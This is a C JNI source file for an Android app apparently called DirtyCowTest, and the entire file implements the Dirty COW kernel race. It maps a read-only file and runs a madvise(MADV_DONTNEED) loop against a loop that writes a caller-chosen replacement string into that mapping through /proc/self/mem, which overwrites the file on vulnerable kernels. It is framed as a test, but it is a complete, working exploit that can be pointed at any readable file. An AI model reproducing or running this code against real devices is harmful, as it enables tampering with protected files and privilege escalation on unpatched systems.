#include <stdio.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <android/log.h>
#include <jni.h>

#define TAG "DirtyCowTest_Jni"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, TAG,__VA_ARGS__)

#define LOOP_COUNT 10000000 // 10^7
#define PROGRES_DIVIDER (LOOP_COUNT / 1000)

static void *map;
static int stopLoop = 0;
static int f;

JNIEXPORT void JNICALL
Java_millosr_github_com_dirtycowtest_DirtyCowTest_openTestFile(JNIEnv *env, jobject instance,
                                                               jstring filename_) {
    const char *filename = (*env)->GetStringUTFChars(env, filename_, 0);

    struct stat st;

    f=open(filename,O_RDONLY);
    fstat(f,&st);

    map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
    LOGI("mmap %zx",(uintptr_t) map);

    stopLoop = 0;

    (*env)->ReleaseStringUTFChars(env, filename_, filename);
}

JNIEXPORT void JNICALL
Java_millosr_github_com_dirtycowtest_DirtyCowTest_madviceLoop(JNIEnv *env, jobject instance) {
    jclass cls = (*env)->GetObjectClass(env, instance);
    jmethodID methodId = (*env)->GetMethodID(env, cls, "setTestProgress", "(I)V");
    LOGI("methodId = %d", methodId);

    int i,c=0, progress;
    for (i=0;i<LOOP_COUNT && !stopLoop;i++) {
        c+=madvise(map,100,MADV_DONTNEED);
        if (i%1000 == 0) {
            progress = i / PROGRES_DIVIDER;
            (*env)->CallVoidMethod(env, instance, methodId, progress);
        }
    }
    LOGI("madvise %d",c);
    stopLoop = 1;
}

JNIEXPORT void JNICALL
Java_millosr_github_com_dirtycowtest_DirtyCowTest_procselfmemLoop(JNIEnv *env, jobject instance,
                                                                  jstring replacement_) {
    const char *replacement = (*env)->GetStringUTFChars(env, replacement_, 0);

    int f=open("/proc/self/mem", O_RDWR);
    int i,c=0;
    while (!stopLoop) {
        lseek(f,(uintptr_t) map, SEEK_SET);
        c+=write(f, replacement, strlen(replacement));
    }
    LOGI("procselfmem %d", c);
    (*env)->ReleaseStringUTFChars(env, replacement_, replacement);
}

JNIEXPORT void JNICALL
Java_millosr_github_com_dirtycowtest_DirtyCowTest_closeTestFile(JNIEnv *env, jobject instance) {
    close(f);
}

JNIEXPORT void JNICALL
Java_millosr_github_com_dirtycowtest_DirtyCowTest_stopLoops(JNIEnv *env, jobject instance) {
    stopLoop = 1;
}
